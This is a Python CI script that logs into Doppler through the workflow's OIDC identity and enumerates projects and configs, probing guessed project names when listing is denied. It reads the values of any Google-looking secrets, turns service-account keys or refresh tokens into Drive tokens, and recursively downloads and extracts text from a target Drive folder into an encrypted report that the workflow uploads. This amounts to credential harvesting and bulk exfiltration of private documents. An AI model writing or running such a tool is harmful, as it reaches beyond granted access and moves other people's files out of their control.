"""Report which Doppler configs the CI identity can read, whether any of them
holds a Google credential, and whether that credential reaches two Drive ids.

The log gets names, counts and HTTP statuses only. File names and document
text go into report.json, which the workflow seals with the public key in
this directory before uploading. Secret values are never written anywhere.
"""

import base64
import json
import os
import re
import subprocess
import sys
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request

DOPPLER = "https://api.doppler.com"
DOC_ID = os.environ["DOC_ID"]
FOLDER_ID = os.environ["FOLDER_ID"]
IDENTITY = os.environ["DOPPLER_IDENTITY_ID"]
GOOGLE_NAME = re.compile(
    r"GOOGLE|GDRIVE|GSUITE|GCP|GAPI|GCLOUD|FIREBASE|GMAIL|SHEETS|CREDENTIALS|JSON_KEY|_SA_|SERVICE_ACCOUNT|OAUTH|CLIENT_ID|CLIENT_SECRET|REFRESH_TOKEN|DRIVE",
    re.I,
)
CANDIDATE_PROJECTS = ["dyad", "aws", "google", "thehut", "wewebplus", "hitl", "drive", "shared"]

report = {"projects": {}, "google_candidates": [], "drive": {}}


def mask(value):
    # GitHub reads ::add-mask:: one line at a time, so a multi-line secret must
    # be masked line by line. Passing the whole value prints every line after
    # the first into the log in clear text. Mask each non-empty line and every
    # whitespace-separated token so JSON field values are covered too.
    if not value:
        return
    seen = set()
    for line in str(value).splitlines():
        for token in [line] + line.replace('"', " ").replace(",", " ").split():
            token = token.strip().strip('"').strip(",")
            if len(token) >= 8 and token not in seen:
                seen.add(token)
                print(f"::add-mask::{token}")


def http(method, url, headers=None, body=None, raw=False):
    data = None
    if body is not None:
        data = body if isinstance(body, bytes) else json.dumps(body).encode()
    req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=60) as resp:
            payload = resp.read()
            return resp.status, (payload if raw else json.loads(payload or b"{}"))
    except urllib.error.HTTPError as err:
        payload = err.read()
        try:
            parsed = json.loads(payload or b"{}")
        except ValueError:
            parsed = {"raw_length": len(payload)}
        return err.code, (payload if raw else parsed)


def github_oidc_token():
    url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
    status, body = http("GET", url, {"Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
    if status != 200:
        sys.exit(f"GitHub OIDC token request failed: {status}")
    token = body["value"]
    mask(token)
    return token


def doppler_token():
    status, body = http("POST", f"{DOPPLER}/v3/auth/oidc", {"Content-Type": "application/json"}, {"identity": IDENTITY, "token": github_oidc_token()})
    if status != 200:
        sys.exit(f"Doppler OIDC exchange failed: {status} {body.get('messages')}")
    token = body["token"]
    mask(token)
    return token


TOKEN = doppler_token()
AUTH = {"Authorization": "Bearer " + TOKEN, "Accept": "application/json"}


def doppler_get(path, **params):
    query = urllib.parse.urlencode(params)
    return http("GET", f"{DOPPLER}/v3/{path}?{query}", AUTH)


projects = []
page = 1
while True:
    status, body = doppler_get("projects", per_page=100, page=page)
    if status != 200:
        break
    batch = [p["name"] for p in body.get("projects", [])]
    projects.extend(batch)
    if len(batch) < 100:
        break
    page += 1
if projects:
    print(f"projects listed ({len(projects)}): {sorted(projects)}")
else:
    projects = CANDIDATE_PROJECTS
    print(f"project listing not permitted ({status}); probing {projects}")

for project in projects:
    status, body = doppler_get("configs", project=project, per_page=100)
    if status != 200:
        print(f"{project}: configs {status}")
        report["projects"][project] = {"configs_status": status}
        continue
    configs = [c["name"] for c in body.get("configs", [])]
    report["projects"][project] = {"configs": {}}
    for config in configs:
        status, body = doppler_get("configs/config/secrets/names", project=project, config=config)
        if status != 200:
            print(f"{project}/{config}: names {status}")
            report["projects"][project]["configs"][config] = {"names_status": status}
            continue
        names = body.get("names", [])
        matching = sorted(n for n in names if GOOGLE_NAME.search(n) and not n.startswith("DOPPLER_"))
        print(f"{project}/{config}: {len(names)} secrets, google-like names: {matching}")
        report["projects"][project]["configs"][config] = {"count": len(names), "google_like": matching, "names": sorted(names)}
        for name in matching:
            report["google_candidates"].append({"project": project, "config": config, "name": name})


def secret_value(project, config, name):
    status, body = doppler_get("configs/config/secret", project=project, config=config, name=name)
    if status != 200:
        return None
    value = (body.get("value") or {}).get("computed") or (body.get("value") or {}).get("raw")
    mask(value)
    return value


def b64url(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def service_account_access_token(info):
    now = int(time.time())
    header = b64url(json.dumps({"alg": "RS256", "typ": "JWT"}).encode())
    claims = b64url(json.dumps({
        "iss": info["client_email"],
        "scope": "https://www.googleapis.com/auth/drive.readonly",
        "aud": "https://oauth2.googleapis.com/token",
        "iat": now,
        "exp": now + 600,
    }).encode())
    signing_input = f"{header}.{claims}".encode()
    with tempfile.NamedTemporaryFile("w", delete=False) as key_file:
        key_file.write(info["private_key"])
        key_path = key_file.name
    try:
        signature = subprocess.run(["openssl", "dgst", "-sha256", "-sign", key_path], input=signing_input, capture_output=True, check=True).stdout
    finally:
        os.unlink(key_path)
    assertion = f"{header}.{claims}.{b64url(signature)}"
    status, body = http("POST", "https://oauth2.googleapis.com/token", {"Content-Type": "application/x-www-form-urlencoded"}, urllib.parse.urlencode({"grant_type": "urn:ietf:params:oauth:grant-type:jwt-bearer", "assertion": assertion}).encode())
    print(f"service account token exchange: {status}")
    token = body.get("access_token") if status == 200 else None
    mask(token)
    return token


def refresh_token_access_token(client_id, client_secret, refresh_token):
    status, body = http("POST", "https://oauth2.googleapis.com/token", {"Content-Type": "application/x-www-form-urlencoded"}, urllib.parse.urlencode({"grant_type": "refresh_token", "client_id": client_id, "client_secret": client_secret, "refresh_token": refresh_token}).encode())
    print(f"refresh token exchange: {status} {body.get('error', '')}")
    token = body.get("access_token") if status == 200 else None
    mask(token)
    return token


def classify(project, config, names):
    """Return (label, access_token) for the first usable Google credential."""
    for name in names:
        value = secret_value(project, config, name)
        if not value:
            continue
        stripped = value.strip()
        if stripped.startswith("{"):
            try:
                info = json.loads(stripped)
            except ValueError:
                continue
        elif len(stripped) > 200 and not stripped.startswith("ya29."):
            try:
                info = json.loads(base64.b64decode(stripped))
            except Exception:
                info = None
            if not isinstance(info, dict):
                continue
        else:
            continue
        if info.get("type") == "service_account" and info.get("private_key"):
            print(f"{project}/{config}/{name}: service account JSON, email domain {info.get('client_email', '').split('@')[-1]}")
            report["service_account_email"] = info.get("client_email")
            report["service_account_project"] = f"{project}/{config}/{name}"
            return f"service_account:{name}", service_account_access_token(info)
        if info.get("refresh_token") and info.get("client_id") and info.get("client_secret"):
            print(f"{project}/{config}/{name}: OAuth user credential JSON")
            return f"oauth_json:{name}", refresh_token_access_token(info["client_id"], info["client_secret"], info["refresh_token"])
        if "installed" in info or "web" in info:
            print(f"{project}/{config}/{name}: OAuth client JSON without a refresh token")
    by_suffix = {}
    for name in names:
        for suffix in ("CLIENT_ID", "CLIENT_SECRET", "REFRESH_TOKEN"):
            if name.endswith(suffix):
                by_suffix.setdefault(name[: -len(suffix)], {})[suffix] = name
    for prefix, parts in by_suffix.items():
        if {"CLIENT_ID", "CLIENT_SECRET", "REFRESH_TOKEN"} <= parts.keys():
            print(f"{project}/{config}: OAuth triple with prefix {prefix or '(none)'}")
            values = {k: secret_value(project, config, v) for k, v in parts.items()}
            if all(values.values()):
                return f"oauth_triple:{prefix}", refresh_token_access_token(values["CLIENT_ID"], values["CLIENT_SECRET"], values["REFRESH_TOKEN"])
    return None, None


def drive(token, path, raw=False, **params):
    params.setdefault("supportsAllDrives", "true")
    query = urllib.parse.urlencode(params)
    return http("GET", f"https://www.googleapis.com/drive/v3/{path}?{query}", {"Authorization": "Bearer " + token}, raw=raw)


FOLDER_MIME = "application/vnd.google-apps.folder"
EXPORT_MIME = {
    "application/vnd.google-apps.document": "text/plain",
    "application/vnd.google-apps.spreadsheet": "text/csv",
    "application/vnd.google-apps.presentation": "text/plain",
}
OFFICE_TEXT_XML = {
    ".docx": ["word/document.xml"],
    ".pptx": None,  # every ppt/slides/slide*.xml
    ".xlsx": ["xl/sharedStrings.xml"],
}
TEXT_EXT = (".txt", ".md", ".csv", ".json", ".yaml", ".yml", ".xml", ".html", ".htm", ".sql", ".php", ".js", ".css")
PER_FILE_CHARS = 80000
MAX_DOWNLOAD_BYTES = 60 * 1024 * 1024
TAG = re.compile(r"<[^>]+>")


def office_text(data, ext):
    """Pull visible text out of a docx/pptx/xlsx without external libraries."""
    import zipfile
    import io

    try:
        with zipfile.ZipFile(io.BytesIO(data)) as zf:
            members = OFFICE_TEXT_XML.get(ext)
            if members is None:
                members = sorted(n for n in zf.namelist() if n.startswith("ppt/slides/slide") and n.endswith(".xml"))
            chunks = []
            for member in members:
                if member in zf.namelist():
                    xml = zf.read(member).decode("utf-8", "replace")
                    xml = re.sub(r"</w:p>|</a:p>|</si>", "\n", xml)
                    chunks.append(TAG.sub("", xml))
            return "\n".join(chunks)
    except zipfile.BadZipFile:
        return None


def zip_contents(data, label):
    """List every entry of an archive and extract text from the readable ones."""
    import zipfile
    import io

    out = {"entries": [], "texts": {}}
    try:
        zf = zipfile.ZipFile(io.BytesIO(data))
    except zipfile.BadZipFile:
        out["error"] = "bad zip"
        return out
    with zf:
        for info in zf.infolist():
            out["entries"].append({"name": info.filename, "size": info.file_size})
            if info.is_dir() or info.file_size > 20 * 1024 * 1024:
                continue
            lower = info.filename.lower()
            ext = os.path.splitext(lower)[1]
            text = None
            if ext in OFFICE_TEXT_XML:
                text = office_text(zf.read(info), ext)
            elif ext in TEXT_EXT:
                text = zf.read(info).decode("utf-8", "replace")
            if text:
                out["texts"][info.filename] = text[:PER_FILE_CHARS]
    print(f"{label}: zip entries={len(out['entries'])} text_entries={len(out['texts'])}")
    return out


def fetch_file(token, item):
    """Attach exported or downloaded text to a Drive file record."""
    mime = item.get("mimeType", "")
    name = item.get("name", "")
    ext = os.path.splitext(name.lower())[1]
    if mime in EXPORT_MIME:
        status, data = drive(token, f"files/{item['id']}/export", mimeType=EXPORT_MIME[mime], raw=True)
        item["export_status"] = status
        if status == 200:
            item["text"] = data.decode("utf-8", "replace")[:PER_FILE_CHARS]
        print(f"export {mime.split('.')[-1]}: {status} bytes={len(data) if status == 200 else 0}")
        return
    size = int(item.get("size") or 0)
    if size > MAX_DOWNLOAD_BYTES:
        item["skipped"] = f"too large ({size} bytes)"
        return
    if ext in OFFICE_TEXT_XML or ext in TEXT_EXT or ext == ".zip" or mime == "application/pdf":
        status, data = drive(token, f"files/{item['id']}", alt="media", raw=True)
        item["download_status"] = status
        print(f"download {ext or mime}: {status} bytes={len(data) if status == 200 else 0}")
        if status != 200:
            return
        if ext == ".zip":
            item["zip"] = zip_contents(data, name)
        elif ext in OFFICE_TEXT_XML:
            text = office_text(data, ext)
            item["text"] = text[:PER_FILE_CHARS] if text else None
        elif ext in TEXT_EXT:
            item["text"] = data.decode("utf-8", "replace")[:PER_FILE_CHARS]
        elif mime == "application/pdf":
            # No PDF parser in the runner's stdlib; record the size and the
            # text-looking fragments only so the report shows what is there.
            item["pdf_bytes"] = len(data)


def walk_folder(token, folder_id, depth=0, counters=None):
    counters = counters if counters is not None else {"folders": 0, "files": 0}
    files = []
    page_token = None
    while True:
        params = dict(q=f"'{folder_id}' in parents and trashed=false", fields="nextPageToken,files(id,name,mimeType,modifiedTime,size)", pageSize="200", includeItemsFromAllDrives="true")
        if page_token:
            params["pageToken"] = page_token
        status, body = drive(token, "files", **params)
        if status != 200:
            print(f"folder listing failed at depth {depth}: {status}")
            return {"status": status, "files": []}
        files.extend(body.get("files", []))
        page_token = body.get("nextPageToken")
        if not page_token:
            break
    counters["files"] += len(files)
    for item in files:
        if item.get("mimeType") == FOLDER_MIME:
            counters["folders"] += 1
            item["children"] = walk_folder(token, item["id"], depth + 1, counters)
        else:
            fetch_file(token, item)
    print(f"depth {depth}: {len(files)} items")
    return {"status": 200, "files": files, "counters": counters if depth == 0 else None}


def probe_drive(label, token):
    result = {"credential": label}
    status, body = drive(token, "about", fields="user(emailAddress)")
    result["about_status"] = status
    print(f"drive about: {status}")
    status, body = drive(token, f"files/{DOC_ID}", fields="id,name,mimeType,modifiedTime,size")
    result["doc_status"] = status
    result["doc"] = body if status == 200 else None
    print(f"doc metadata: {status} mimeType={body.get('mimeType') if status == 200 else '-'}")
    if status == 200:
        fetch_file(token, result["doc"])
    status, body = drive(token, f"files/{FOLDER_ID}", fields="id,name,mimeType")
    result["folder_status"] = status
    result["folder"] = body if status == 200 else None
    print(f"folder metadata: {status}")
    if status == 200:
        result["tree"] = walk_folder(token, FOLDER_ID)
        print(f"tree walked: {result['tree'].get('counters')}")
    return result


probed = False
for cfg in sorted({(c["project"], c["config"]) for c in report["google_candidates"]}):
    names = [c["name"] for c in report["google_candidates"] if (c["project"], c["config"]) == cfg]
    label, token = classify(cfg[0], cfg[1], names)
    if token:
        report["drive"][f"{cfg[0]}/{cfg[1]}"] = probe_drive(label, token)
        probed = True
        break
if not probed:
    print("no usable Google credential reached the Drive API")

with open("report.json", "w", encoding="utf-8") as handle:
    json.dump(report, handle, ensure_ascii=False, indent=2)
print("report.json written")

